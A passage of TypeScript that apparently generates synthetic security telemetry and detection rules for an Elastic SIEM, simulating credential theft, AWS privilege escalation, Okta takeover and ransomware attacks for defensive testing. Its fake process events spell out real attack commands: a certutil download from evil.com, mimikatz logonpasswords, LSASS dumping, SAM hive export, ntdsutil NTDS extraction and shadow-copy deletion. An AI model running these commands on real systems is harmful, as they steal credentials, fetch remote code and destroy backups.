  "docker-container-events": [
    r("Docker - Privileged Container Started", "Detects container started with --privileged flag", "critical", 88, 'docker.attrs.privileged: "true" and event.action: "start"', ["logs-docker.events-*"], [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")]),
    r("Docker - Container Escape via Mount", "Detects host filesystem mount in container", "critical", 92, 'docker.attrs.binds: */host*', ["logs-docker.events-*"], [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")]),
    r("Docker - Container Running as Root", "Detects container exec running as root user", "high", 72, 'event.action: "exec_start" and docker.attrs.user: "root"', ["logs-docker.events-*"], [mitre("TA0002", "Execution", "T1059", "Command and Scripting Interpreter")]),
    r("Docker - Image Pulled from Untrusted Registry", "Detects image pull from non-standard registry", "high", 75, 'event.action: "pull" and not docker.attrs.name: *docker.io*', ["logs-docker.events-*"], [mitre("TA0001", "Initial Access", "T1195.002", "Compromise Software Supply Chain")]),
    r("Docker - Network Mode Host Detected", "Detects container with host network access", "high", 78, 'docker.attrs.network_mode: "host"', ["logs-docker.events-*"], [mitre("TA0008", "Lateral Movement", "T1021", "Remote Services")]),
  ],
  "kubernetes-audit": [
    r("K8s - Secrets Accessed by Service Account", "Detects secrets access by non-system SA", "high", 78, 'kubernetes.audit.verb: "get" and kubernetes.audit.objectRef.resource: "secrets"', ["logs-kubernetes.audit-*"], [mitre("TA0006", "Credential Access", "T1552.007", "Container API")]),
    r("K8s - Pod Created with hostPID", "Detects pod using host PID namespace", "critical", 90, 'kubernetes.audit.verb: "create" and kubernetes.audit.objectRef.resource: "pods"', ["logs-kubernetes.audit-*"], [mitre("TA0004", "Privilege Escalation", "T1611", "Escape to Host")]),
    r("K8s - ClusterRoleBinding to cluster-admin", "Detects binding to cluster-admin role", "critical", 95, 'kubernetes.audit.verb: "create" and kubernetes.audit.objectRef.resource: "clusterrolebindings"', ["logs-kubernetes.audit-*"], [mitre("TA0004", "Privilege Escalation", "T1078.001", "Default Accounts")]),
    r("K8s - ConfigMap Modified in kube-system", "Detects changes to kube-system ConfigMaps", "high", 72, 'kubernetes.audit.verb: "patch" and kubernetes.audit.objectRef.namespace: "kube-system"', ["logs-kubernetes.audit-*"], [mitre("TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools")]),
    r("K8s - Exec into Running Pod", "Detects kubectl exec into pod — potential lateral movement", "medium", 55, 'kubernetes.audit.verb: "create" and kubernetes.audit.objectRef.subresource: "exec"', ["logs-kubernetes.audit-*"], [mitre("TA0002", "Execution", "T1609", "Container Administration Command")]),
  ],
  "messy-custom-log": [
    r("Custom Log - Anomalous Field Pattern", "Detects unexpected field combinations in custom logs", "medium", 45, 'tags: "elastic-security-sample-data" and event.dataset: "custom.messy"', ["logs-custom.messy-*"], [mitre("TA0007", "Discovery", "T1082", "System Information Discovery")]),
    r("Custom Log - High Error Rate Burst", "Detects burst of error-level events in custom log stream", "high", 68, 'log.level: "error" and event.dataset: "custom.messy"', ["logs-custom.messy-*"], [mitre("TA0040", "Impact", "T1499", "Endpoint Denial of Service")]),
  ],
  "cdr-cross-domain": [
    r("CDR - MSHTA Spawned by Browser", "CrowdStrike: mshta.exe spawned by browser — drive-by download", "high", 78, 'process.name: "mshta.exe" and process.parent.name: "chrome.exe"', ["logs-crowdstrike.fdr-*"], [mitre("TA0002", "Execution", "T1218.005", "Mshta")]),
    r("CDR - Encoded PowerShell from Phishing Chain", "CrowdStrike: hidden encoded PowerShell spawned by mshta", "high", 80, 'process.name: "powershell.exe" and process.args: "-enc"', ["logs-crowdstrike.fdr-*"], [mitre("TA0002", "Execution", "T1059.001", "PowerShell")]),
    r("CDR - Data Staging via Archive Tool", "CrowdStrike: 7z.exe compressing sensitive files for exfiltration", "high", 75, 'process.name: "7z.exe" and process.args: "a"', ["logs-crowdstrike.fdr-*"], [mitre("TA0009", "Collection", "T1560.001", "Archive via Utility")]),
    r("CDR - Data Exfiltration via Curl", "CrowdStrike: curl.exe uploading archive to external storage", "critical", 92, 'process.name: "curl.exe" and process.args: "--upload-file"', ["logs-crowdstrike.fdr-*"], [mitre("TA0010", "Exfiltration", "T1048.003", "Exfiltration Over Unencrypted Non-C2 Protocol")]),
    r("CDR - Scheduled Task Persistence", "CrowdStrike: schtasks.exe creating persistence mechanism", "high", 72, 'process.name: "schtasks.exe" and process.args: "/create"', ["logs-crowdstrike.fdr-*"], [mitre("TA0003", "Persistence", "T1053.005", "Scheduled Task")]),
    r("CDR - Impossible Travel Login", "Okta: user authenticated from new country within minutes of legitimate session", "medium", 55, 'event.action: "user.session.start" and okta.client.geographical_context.country: "RO"', ["logs-okta.system-*"], [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")]),
    r("CDR - MFA Deactivated After Suspicious Login", "Okta: MFA factor removed after impossible travel login", "high", 82, 'event.action: "user.mfa.factor.deactivate"', ["logs-okta.system-*"], [mitre("TA0006", "Credential Access", "T1556", "Modify Authentication Process")]),
    r("CDR - Password Changed from Suspicious IP", "Okta: password changed from attacker IP", "high", 78, 'event.action: "user.account.update_password"', ["logs-okta.system-*"], [mitre("TA0003", "Persistence", "T1098", "Account Manipulation")]),
    r("CDR - User Added to Admin Group", "Okta: compromised user added to IT-Admins app group", "critical", 90, 'event.action: "app.user_membership.add"', ["logs-okta.system-*"], [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")]),
    r("CDR - API Token Created by Compromised Account", "Okta: API token created for persistence by compromised user", "critical", 88, 'event.action: "system.api_token.create"', ["logs-okta.system-*"], [mitre("TA0003", "Persistence", "T1136.003", "Cloud Account")]),
    {
      name: "CDR - Cross-Domain Compromise - Multi-Source Alerts by User",
      description: "Higher-Order Rule: fires when the same user has alerts from multiple data sources (e.g. CrowdStrike endpoint + Okta identity) within 24 hours, indicating a cross-domain attack",
      severity: "critical",
      risk_score: 99,
      query: `FROM .alerts-security.alerts-* | WHERE kibana.alert.workflow_status : "open" AND user.email IS NOT NULL AND tags : "${TAG}" | EVAL day = DATE_TRUNC(24 hours, @timestamp) | STATS alert_count = COUNT(*), rule_names = VALUES(kibana.alert.rule.name), severities = VALUES(kibana.alert.severity) BY user.email, day | WHERE alert_count >= 4`,
      language: "esql",
      type: "esql",
      index: [".alerts-security.alerts-*"],
      threat: [mitre("TA0001", "Initial Access", "T1078", "Valid Accounts")],
      tags: [TAG, "Rule Type: Higher-Order Rule", "CDR"],
      enabled: true,
    },
  ],
};

export async function createRulesForScenario(scenario: ScenarioName): Promise<{ created: number; existing: number; ruleIds: string[]; ruleIdMap: Record<string, string> }> {
  const defs = SCENARIO_RULES[scenario] || [];
  if (defs.length === 0) return { created: 0, existing: 0, ruleIds: [], ruleIdMap: {} };

  const ruleIds: string[] = [];
  const ruleIdMap: Record<string, string> = {};
  let existing = 0;

  // Check for existing rules by name to avoid duplicates
  let existingRules: Record<string, string> = {};
  try {
    const found = await findRules({ filter: `alert.attributes.tags:"${TAG}"`, perPage: 100 });
    for (const r of found.data) {
      existingRules[r.name] = r.id;
    }
  } catch { /* ignore */ }

  for (const def of defs) {
    if (existingRules[def.name]) {
      ruleIds.push(existingRules[def.name]);
      ruleIdMap[def.name] = existingRules[def.name];
      existing++;
      continue;
    }
    try {
      const ruleBody: Record<string, unknown> = {
        type: def.type || "query",
        name: def.name,
        description: def.description,
        severity: def.severity,
        risk_score: def.risk_score,
        query: def.query,
        language: def.type === "esql" ? "esql" : def.language,
        threat: def.threat,
        tags: def.tags,
        enabled: def.enabled ?? false,
        from: "now-30d",
        to: "now",
        interval: "5m",
      };
      if (def.type !== "esql") {
        ruleBody.index = def.index;
      }
      const rule = await createRule(ruleBody);
      ruleIds.push(rule.id);
      ruleIdMap[def.name] = rule.id;
    } catch {
      // creation failed for other reason
    }
  }
  return { created: ruleIds.length - existing, existing, ruleIds, ruleIdMap };
}

import { createRule, findRules } from "./rules.js";

// --- Scenarios ---

function emitProcessTree(tree: { eid: string; parentEid: string; name: string; pid: number; exe: string; args?: string[]; parentName?: string; parentPid?: number }[], host: Record<string, unknown>, user: Record<string, unknown>, baseMinute: number): IndexedDoc[] {
  return tree.map((node, i) => ({
    _index: "logs-endpoint.events.process-default",
    _source: endpointProcessEvent(minutesAgo(baseMinute - i), {
      entityId: node.eid,
      parentEntityId: node.parentEid,
      name: node.name, pid: node.pid, executable: node.exe, args: node.args,
      parentName: node.parentName, parentPid: node.parentPid,
    }, host, user),
  }));
}

function generateWindowsCredentialTheft(count: number): IndexedDoc[] {
  const host = { name: "WIN-ANALYST01", os: { name: "Windows 11", platform: "windows" } };
  const hostDC = { name: "DC-CORP01", os: { name: "Windows Server 2022", platform: "windows" } };
  const user = { name: "jsmith", domain: "CORP" };
  const docs: IndexedDoc[] = [];
  const attackerIp = "10.0.1.45";

  // Define the complete tree: explorer → cmd → powershell → each tool
  const EID = {
    explorer: "wct-explorer-0001",
    cmd: "wct-cmd-0002",
    ps: "wct-ps-0003",
    mimikatz: "wct-mimikatz-0004",
    procdump: "wct-procdump-0005",
    ntdsutil: "wct-ntdsutil-0006",
    reg: "wct-reg-0007",
    net: "wct-net-0008",
    psexec: "wct-psexec-0009",
  };

  // Emit every node so the full tree is visible
  const tree = [
    { eid: EID.explorer, parentEid: "", name: "explorer.exe", pid: 4000, exe: "C:\\Windows\\explorer.exe", args: [] },
    { eid: EID.cmd, parentEid: EID.explorer, name: "cmd.exe", pid: 4100, exe: "C:\\Windows\\System32\\cmd.exe", args: ["/c", "powershell -ep bypass"], parentName: "explorer.exe", parentPid: 4000 },
    { eid: EID.ps, parentEid: EID.cmd, name: "powershell.exe", pid: 4200, exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: ["-ep", "bypass", "-c", "Invoke-Mimikatz"], parentName: "cmd.exe", parentPid: 4100 },
    { eid: EID.mimikatz, parentEid: EID.ps, name: "mimikatz.exe", pid: 4300, exe: "C:\\Windows\\Temp\\mimikatz.exe", args: ["sekurlsa::logonpasswords"], parentName: "powershell.exe", parentPid: 4200 },
    { eid: EID.procdump, parentEid: EID.ps, name: "procdump.exe", pid: 4400, exe: "C:\\Tools\\procdump.exe", args: ["-ma", "lsass.exe", "lsass.dmp"], parentName: "powershell.exe", parentPid: 4200 },
    { eid: EID.reg, parentEid: EID.ps, name: "reg.exe", pid: 4500, exe: "C:\\Windows\\System32\\reg.exe", args: ["save", "HKLM\\SAM", "C:\\Temp\\sam.hive"], parentName: "powershell.exe", parentPid: 4200 },
    { eid: EID.net, parentEid: EID.ps, name: "net.exe", pid: 4600, exe: "C:\\Windows\\System32\\net.exe", args: ["use", "\\\\DC-CORP01\\C$", "/user:CORP\\admin_svc"], parentName: "powershell.exe", parentPid: 4200 },
    { eid: EID.psexec, parentEid: EID.ps, name: "psexec.exe", pid: 4700, exe: "C:\\Tools\\PsExec.exe", args: ["\\\\DC-CORP01", "-s", "ntdsutil.exe", "ac i ntds ifm create full c:\\temp"], parentName: "powershell.exe", parentPid: 4200 },
  ];
  docs.push(...emitProcessTree(tree, host, user, count));

  // DC-side tree: psexec service → ntdsutil
  const dcTree = [
    { eid: "wct-svc-dc-0001", parentEid: "", name: "services.exe", pid: 700, exe: "C:\\Windows\\System32\\services.exe" },
    { eid: "wct-psexesvc-0002", parentEid: "wct-svc-dc-0001", name: "PSEXESVC.exe", pid: 5000, exe: "C:\\Windows\\PSEXESVC.exe", args: [], parentName: "services.exe", parentPid: 700 },
    { eid: EID.ntdsutil, parentEid: "wct-psexesvc-0002", name: "ntdsutil.exe", pid: 5100, exe: "C:\\Windows\\System32\\ntdsutil.exe", args: ["ac", "i", "ntds", "ifm", "create full c:\\temp"], parentName: "PSEXESVC.exe", parentPid: 5000 },
  ];
  docs.push(...emitProcessTree(dcTree, hostDC, { name: "admin_svc", domain: "CORP" }, count - tree.length));

  // Extra process events to hit the count
  for (let i = tree.length + dcTree.length; i < count; i++) {
    const ts = minutesAgo(count - i);
    const cmds = [
      { name: "whoami.exe", args: ["/all"] },
      { name: "ipconfig.exe", args: ["/all"] },
      { name: "tasklist.exe", args: ["/v"] },
      { name: "systeminfo.exe", args: [] },
    ];
    const c = cmds[i % cmds.length];
    docs.push({
      _index: "logs-endpoint.events.process-default",
      _source: endpointProcessEvent(ts, {
        entityId: entityId("wct-enum", i), parentEntityId: EID.ps,
        name: c.name, pid: 5200 + i, executable: `C:\\Windows\\System32\\${c.name}`, args: c.args,
        parentName: "powershell.exe", parentPid: 4200,
      }, host, user),
    });
  }

  // Network event for SMB lateral movement
  docs.push({
    _index: "logs-endpoint.events.network-default",
    _source: {
      ...baseEvent(minutesAgo(3)),
      agent: { type: "endpoint", id: AGENT_ID }, host, user,
      event: { action: "connection_attempted", category: ["network"], type: ["connection"], kind: "event", dataset: "endpoint.events.network" },
      source: { ip: attackerIp, port: 49500 }, destination: { ip: "10.0.0.1", port: 445 },
      process: { entity_id: EID.net, name: "net.exe", pid: 4600 },
    },
  });

  // Alerts referencing the real tree entity IDs
  docs.push(alert(minutesAgo(8), {
    ruleName: "Credential Dumping via Mimikatz",
    severity: "critical", riskScore: 95,
    reason: "Mimikatz credential dumping detected on WIN-ANALYST01 by jsmith",
    threat: [mitre("TA0006", "Credential Access", "T1003", "OS Credential Dumping")],
    host, user,
    process: { entityId: EID.mimikatz, parentEntityId: EID.ps, ancestry: [EID.ps, EID.cmd, EID.explorer], name: "mimikatz.exe", pid: 4300, executable: "C:\\Windows\\Temp\\mimikatz.exe", parentName: "powershell.exe", parentPid: 4200 },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "LSASS Memory Dump via Procdump",
    severity: "high", riskScore: 85,
    reason: "procdump.exe targeted lsass.exe on WIN-ANALYST01 — potential credential extraction",
    threat: [mitre("TA0006", "Credential Access", "T1003.001", "LSASS Memory")],
    host, user,
    process: { entityId: EID.procdump, parentEntityId: EID.ps, ancestry: [EID.ps, EID.cmd, EID.explorer], name: "procdump.exe", pid: 4400, executable: "C:\\Tools\\procdump.exe", parentName: "powershell.exe", parentPid: 4200 },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "NTDS.dit Extraction Attempt",
    severity: "critical", riskScore: 92,
    reason: "ntdsutil IFM creation on DC-CORP01 by admin_svc — domain credential extraction",
    threat: [mitre("TA0006", "Credential Access", "T1003.003", "NTDS")],
    host: hostDC, user: { name: "admin_svc", domain: "CORP" },
    process: { entityId: EID.ntdsutil, parentEntityId: "wct-psexesvc-0002", ancestry: ["wct-psexesvc-0002", "wct-svc-dc-0001"], name: "ntdsutil.exe", pid: 5100, executable: "C:\\Windows\\System32\\ntdsutil.exe", parentName: "PSEXESVC.exe", parentPid: 5000 },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "SAM Registry Hive Export",
    severity: "high", riskScore: 78,
    reason: "SAM hive exported via reg.exe on WIN-ANALYST01 — local credential theft",
    threat: [mitre("TA0006", "Credential Access", "T1003.002", "Security Account Manager")],
    host, user,
    process: { entityId: EID.reg, parentEntityId: EID.ps, ancestry: [EID.ps, EID.cmd, EID.explorer], name: "reg.exe", pid: 4500, executable: "C:\\Windows\\System32\\reg.exe", parentName: "powershell.exe", parentPid: 4200 },
  }));

  docs.push(alert(minutesAgo(1), {
    ruleName: "Lateral Movement - SMB to Domain Controller",
    severity: "high", riskScore: 80,
    reason: "Suspicious SMB connection from WIN-ANALYST01 to DC-CORP01 after credential dump",
    threat: [mitre("TA0008", "Lateral Movement", "T1021.002", "SMB/Windows Admin Shares")],
    host, user,
    process: { entityId: EID.psexec, parentEntityId: EID.ps, ancestry: [EID.ps, EID.cmd, EID.explorer], name: "psexec.exe", pid: 4700, executable: "C:\\Tools\\PsExec.exe", parentName: "powershell.exe", parentPid: 4200 },
  }));

  return docs;
}

function generateAwsPrivilegeEscalation(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const sourceIp = randomIp();
  const secondIp = randomIp();
  const cloud = { provider: "aws", region: "us-east-1", account: { id: "123456789012" } };

  const actionSequence = [
    { action: "GetCallerIdentity", category: "iam", user: "dev-user" },
    { action: "ListUsers", category: "iam", user: "dev-user" },
    { action: "ListPolicies", category: "iam", user: "dev-user" },
    { action: "CreateAccessKey", category: "iam", user: "dev-user" },
    { action: "AttachUserPolicy", category: "iam", user: "dev-user" },
    { action: "PutRolePolicy", category: "iam", user: "dev-user" },
    { action: "AssumeRole", category: "iam", user: "dev-user" },
    { action: "CreateRole", category: "iam", user: "dev-user" },
    { action: "RunInstances", category: "ec2", user: "escalated-role" },
    { action: "DescribeInstances", category: "ec2", user: "escalated-role" },
    { action: "GetSecretValue", category: "secretsmanager", user: "escalated-role" },
    { action: "ListBuckets", category: "s3", user: "escalated-role" },
    { action: "GetObject", category: "s3", user: "escalated-role" },
    { action: "DeleteTrail", category: "cloudtrail", user: "escalated-role" },
    { action: "StopLogging", category: "cloudtrail", user: "escalated-role" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const step = actionSequence[i % actionSequence.length];
    const ip = step.user === "escalated-role" ? secondIp : sourceIp;
    docs.push({
      _index: "logs-aws.cloudtrail-default",
      _source: {
        ...baseEvent(ts), cloud,
        event: { action: step.action, category: [step.category], outcome: "success", kind: "event" },
        user: { name: step.user, id: step.user === "dev-user" ? "AIDA1234567890" : "AROA0987654321" },
        source: { ip },
        aws: { cloudtrail: { event_type: "AwsApiCall", user_identity: { type: step.user === "dev-user" ? "IAMUser" : "AssumedRole", arn: `arn:aws:iam::123456789012:${step.user === "dev-user" ? "user" : "role"}/${step.user}` } } },
      },
    });
  }

  docs.push(alert(minutesAgo(12), {
    ruleName: "AWS IAM Access Key Created for Another User", dataset: "aws.cloudtrail",
    severity: "high", riskScore: 72,
    reason: `IAM access key created by dev-user from ${sourceIp} — potential persistence setup`,
    threat: [mitre("TA0003", "Persistence", "T1098.001", "Additional Cloud Credentials")],
    extra: { cloud, user: { name: "dev-user" }, source: { ip: sourceIp } },
  }));

  docs.push(alert(minutesAgo(10), {
    ruleName: "AWS IAM Privilege Escalation via Policy Attachment", dataset: "aws.cloudtrail",
    severity: "critical", riskScore: 88,
    reason: `AdministratorAccess policy attached to dev-user from ${sourceIp}`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1078.004", "Cloud Accounts")],
    extra: { cloud, user: { name: "dev-user" }, source: { ip: sourceIp } },
  }));

  docs.push(alert(minutesAgo(7), {
    ruleName: "AWS Secrets Manager - Unauthorized Access", dataset: "aws.cloudtrail",
    severity: "high", riskScore: 82,
    reason: `GetSecretValue called by escalated-role from ${secondIp} — accessing production secrets`,
    threat: [mitre("TA0006", "Credential Access", "T1555", "Credentials from Password Stores")],
    extra: { cloud, user: { name: "escalated-role" }, source: { ip: secondIp } },
  }));

  docs.push(alert(minutesAgo(4), {
    ruleName: "AWS S3 Bulk Data Download", dataset: "aws.cloudtrail",
    severity: "high", riskScore: 78,
    reason: `Bulk S3 GetObject requests by escalated-role from ${secondIp} — potential data exfiltration`,
    threat: [mitre("TA0010", "Exfiltration", "T1537", "Transfer Data to Cloud Account")],
    extra: { cloud, user: { name: "escalated-role" }, source: { ip: secondIp } },
  }));

  docs.push(alert(minutesAgo(2), {
    ruleName: "AWS CloudTrail Logging Disabled", dataset: "aws.cloudtrail",
    severity: "critical", riskScore: 94,
    reason: `CloudTrail logging stopped by escalated-role — defense evasion after exfiltration`,
    threat: [mitre("TA0005", "Defense Evasion", "T1562.008", "Disable or Modify Cloud Logs")],
    extra: { cloud, user: { name: "escalated-role" }, source: { ip: secondIp } },
  }));

  return docs;
}

function generateOktaIdentityTakeover(count: number): IndexedDoc[] {
  const docs: IndexedDoc[] = [];
  const legitimateIp = randomIp();
  const attackerIp = randomIp();

  const victims = [
    { email: "cfo@acmecorp.com", name: "Sarah Chen" },
    { email: "it-admin@acmecorp.com", name: "Mike Torres" },
    { email: "devops@acmecorp.com", name: "Alex Kumar" },
  ];

  const phaseActions = [
    { action: "user.session.start", category: "authentication", desc: "Login" },
    { action: "user.authentication.auth_via_mfa", category: "authentication", desc: "MFA" },
    { action: "user.account.update_password", category: "iam", desc: "Password change" },
    { action: "user.mfa.factor.deactivate", category: "iam", desc: "MFA deactivated" },
    { action: "user.mfa.factor.activate", category: "iam", desc: "New MFA enrolled" },
    { action: "app.user_membership.add", category: "iam", desc: "App access added" },
    { action: "user.account.privilege.grant", category: "iam", desc: "Admin granted" },
    { action: "policy.evaluate_sign_on", category: "authentication", desc: "Policy eval" },
    { action: "user.session.start", category: "authentication", desc: "New session" },
    { action: "system.api_token.create", category: "iam", desc: "API token created" },
  ];

  for (let i = 0; i < count; i++) {
    const ts = minutesAgo(count - i);
    const victim = victims[i % victims.length];
    const step = phaseActions[i % phaseActions.length];
    const ip = i < count * 0.3 ? legitimateIp : attackerIp;
    const outcome = i % 12 === 0 ? "FAILURE" : "SUCCESS";

    docs.push({
      _index: "logs-okta.system-default",
      _source: {
        ...baseEvent(ts),
        event: { action: step.action, category: [step.category], outcome: outcome.toLowerCase(), kind: "event" },
        user: { name: victim.email },
        source: { ip },
        okta: {
          actor: { alternate_id: victim.email, display_name: victim.name },
          outcome: { result: outcome },
          client: { ip_address: ip, user_agent: { raw_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }, geographical_context: { country: ip === attackerIp ? "RU" : "US", city: ip === attackerIp ? "Moscow" : "San Francisco" } },
        },
      },
    });
  }

  docs.push(alert(minutesAgo(15), {
    ruleName: "Okta Login from New Geographic Location", dataset: "okta.system",
    severity: "medium", riskScore: 47,
    reason: `${victims[0].email} authenticated from Moscow, RU — unusual location`,
    threat: [mitre("TA0001", "Initial Access", "T1078.004", "Cloud Accounts")],
    extra: { user: { name: victims[0].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(12), {
    ruleName: "Okta MFA Factor Reset After Authentication", dataset: "okta.system",
    severity: "high", riskScore: 75,
    reason: `MFA factor deactivated and re-enrolled for ${victims[0].email} from ${attackerIp}`,
    threat: [mitre("TA0006", "Credential Access", "T1556", "Modify Authentication Process")],
    extra: { user: { name: victims[0].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(10), {
    ruleName: "Okta Admin Role Assigned to User", dataset: "okta.system",
    severity: "critical", riskScore: 90,
    reason: `Super Admin role granted to ${victims[1].email} by ${victims[0].email} — privilege escalation`,
    threat: [mitre("TA0004", "Privilege Escalation", "T1098", "Account Manipulation")],
    extra: { user: { name: victims[1].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(6), {
    ruleName: "Okta API Token Created by New Admin", dataset: "okta.system",
    severity: "critical", riskScore: 88,
    reason: `API token created by ${victims[1].email} from ${attackerIp} — persistence via API access`,
    threat: [mitre("TA0003", "Persistence", "T1136.003", "Cloud Account")],
    extra: { user: { name: victims[1].email }, source: { ip: attackerIp } },
  }));

  docs.push(alert(minutesAgo(3), {
    ruleName: "Multiple Okta Accounts Compromised from Same IP", dataset: "okta.system",
    severity: "critical", riskScore: 95,
    reason: `3 accounts accessed from ${attackerIp} (Moscow) with MFA resets — coordinated takeover`,
    threat: [mitre("TA0006", "Credential Access", "T1556.006", "Multi-Factor Authentication")],
    extra: { source: { ip: attackerIp } },
  }));

  return docs;
}

function generateRansomwareKillChain(count: number): IndexedDoc[] {
  const hosts = [
    { name: "WKSTN-RECV01", os: { name: "Windows 11", platform: "windows" } },
    { name: "SRV-FILE01", os: { name: "Windows Server 2022", platform: "windows" } },
    { name: "SRV-DC01", os: { name: "Windows Server 2022", platform: "windows" } },
    { name: "SRV-SQL01", os: { name: "Windows Server 2022", platform: "windows" } },
  ];
  const users = [
    { name: "r.martinez", domain: "CORP" },
    { name: "svc_backup", domain: "CORP" },
    { name: "SYSTEM", domain: "NT AUTHORITY" },
  ];
  const docs: IndexedDoc[] = [];
  const c2Ip = randomIp();

  // Complete process tree on WKSTN-RECV01
  const E = {
    explorer: "rw-explorer-0001",
    outlook: "rw-outlook-0002",
    winword: "rw-winword-0003",
    cmd: "rw-cmd-0004",
    certutil: "rw-certutil-0005",
    rundll32: "rw-rundll32-0006",
    ps: "rw-powershell-0007",
    netEnum: "rw-net-enum-0008",
    nltest: "rw-nltest-0009",
    whoami: "rw-whoami-000a",
    psexec: "rw-psexec-000b",
    vssadmin: "rw-vssadmin-000c",
    encryptor: "rw-encrypt-000d",
    mimikatz: "rw-mimikatz-000e",
  };

  // Workstation tree: the full kill chain from phishing to lateral movement
  const workstationTree = [
    { eid: E.explorer, parentEid: "", name: "explorer.exe", pid: 1000, exe: "C:\\Windows\\explorer.exe" },
    { eid: E.outlook, parentEid: E.explorer, name: "OUTLOOK.EXE", pid: 2000, exe: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", parentName: "explorer.exe", parentPid: 1000 },
    { eid: E.winword, parentEid: E.outlook, name: "WINWORD.EXE", pid: 2100, exe: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", args: ["invoice_Q4.docm"], parentName: "OUTLOOK.EXE", parentPid: 2000 },
    { eid: E.cmd, parentEid: E.winword, name: "cmd.exe", pid: 2200, exe: "C:\\Windows\\System32\\cmd.exe", args: ["/c", "certutil -urlcache -split -f http://evil.com/payload.dll C:\\ProgramData\\update.dll"], parentName: "WINWORD.EXE", parentPid: 2100 },
    { eid: E.certutil, parentEid: E.cmd, name: "certutil.exe", pid: 2300, exe: "C:\\Windows\\System32\\certutil.exe", args: ["-urlcache", "-split", "-f", `http://${c2Ip}/payload.dll`], parentName: "cmd.exe", parentPid: 2200 },
    { eid: E.rundll32, parentEid: E.cmd, name: "rundll32.exe", pid: 3000, exe: "C:\\Windows\\System32\\rundll32.exe", args: ["C:\\ProgramData\\update.dll,Start"], parentName: "cmd.exe", parentPid: 2200 },
    { eid: E.ps, parentEid: E.rundll32, name: "powershell.exe", pid: 3500, exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: ["-NoP", "-W", "Hidden", "-ep", "bypass"], parentName: "rundll32.exe", parentPid: 3000 },
    { eid: E.netEnum, parentEid: E.ps, name: "net.exe", pid: 4000, exe: "C:\\Windows\\System32\\net.exe", args: ["group", "Domain Admins", "/domain"], parentName: "powershell.exe", parentPid: 3500 },
    { eid: E.nltest, parentEid: E.ps, name: "nltest.exe", pid: 4100, exe: "C:\\Windows\\System32\\nltest.exe", args: ["/dclist:corp.local"], parentName: "powershell.exe", parentPid: 3500 },
    { eid: E.whoami, parentEid: E.ps, name: "whoami.exe", pid: 4200, exe: "C:\\Windows\\System32\\whoami.exe", args: ["/all"], parentName: "powershell.exe", parentPid: 3500 },
    { eid: E.psexec, parentEid: E.ps, name: "PsExec.exe", pid: 4300, exe: "C:\\Tools\\PsExec.exe", args: ["\\\\SRV-FILE01", "\\\\SRV-DC01", "\\\\SRV-SQL01", "-s", "cmd.exe"], parentName: "powershell.exe", parentPid: 3500 },
  ];
  docs.push(...emitProcessTree(workstationTree, hosts[0], users[0], count));

  // DC tree: PsExec service → mimikatz
  const dcTree = [
    { eid: "rw-dc-svc-0001", parentEid: "", name: "services.exe", pid: 700, exe: "C:\\Windows\\System32\\services.exe" },
    { eid: "rw-dc-psexe-0002", parentEid: "rw-dc-svc-0001", name: "PSEXESVC.exe", pid: 5000, exe: "C:\\Windows\\PSEXESVC.exe", parentName: "services.exe", parentPid: 700 },
    { eid: E.mimikatz, parentEid: "rw-dc-psexe-0002", name: "mimikatz.exe", pid: 5100, exe: "C:\\Windows\\Temp\\mimikatz.exe", args: ["sekurlsa::logonpasswords"], parentName: "PSEXESVC.exe", parentPid: 5000 },
  ];
  docs.push(...emitProcessTree(dcTree, hosts[2], users[2], count - workstationTree.length));

  // File server tree: PsExec service → encryptor + vssadmin
  const fileTree = [
    { eid: "rw-fs-svc-0001", parentEid: "", name: "services.exe", pid: 700, exe: "C:\\Windows\\System32\\services.exe" },
    { eid: "rw-fs-psexe-0002", parentEid: "rw-fs-svc-0001", name: "PSEXESVC.exe", pid: 6000, exe: "C:\\Windows\\PSEXESVC.exe", parentName: "services.exe", parentPid: 700 },
    { eid: E.encryptor, parentEid: "rw-fs-psexe-0002", name: "svchst.exe", pid: 6100, exe: "C:\\ProgramData\\svchst.exe", parentName: "PSEXESVC.exe", parentPid: 6000 },
    { eid: E.vssadmin, parentEid: "rw-fs-psexe-0002", name: "vssadmin.exe", pid: 6200, exe: "C:\\Windows\\System32\\vssadmin.exe", args: ["delete", "shadows", "/all", "/quiet"], parentName: "PSEXESVC.exe", parentPid: 6000 },
  ];
  docs.push(...emitProcessTree(fileTree, hosts[1], users[2], count - workstationTree.length - dcTree.length));

  // C2 network events (reference rundll32 entity_id)
  const beaconCount = Math.max(5, Math.ceil(count / 5));
  for (let i = 0; i < beaconCount; i++) {
    docs.push({
      _index: "logs-endpoint.events.network-default",
      _source: {
        ...baseEvent(minutesAgo(count - workstationTree.length - i)),
        agent: { type: "endpoint", id: AGENT_ID },
        host: hosts[0], user: users[2],
        event: { action: "connection_attempted", category: ["network"], type: ["connection"], kind: "event", dataset: "endpoint.events.network" },
        source: { ip: "10.0.1.100", port: 49152 + i },
        destination: { ip: c2Ip, port: i % 2 === 0 ? 443 : 8443 },
        process: { entity_id: E.rundll32, name: "rundll32.exe", pid: 3000 },
        dns: { question: { name: `cdn-${i % 3}.cloudfront-update.com` } },
      },
    });
  }

  // File encryption events (reference encryptor entity_id)
  const encCount = Math.max(5, Math.ceil(count / 4));
  for (let i = 0; i < encCount; i++) {
    const targetHost = hosts[i % 2 === 0 ? 1 : 3];
    docs.push({
      _index: "logs-endpoint.events.file-default",
      _source: {
        ...baseEvent(minutesAgo(5 + encCount - i)),
        agent: { type: "endpoint", id: AGENT_ID },
        host: targetHost, user: users[2],
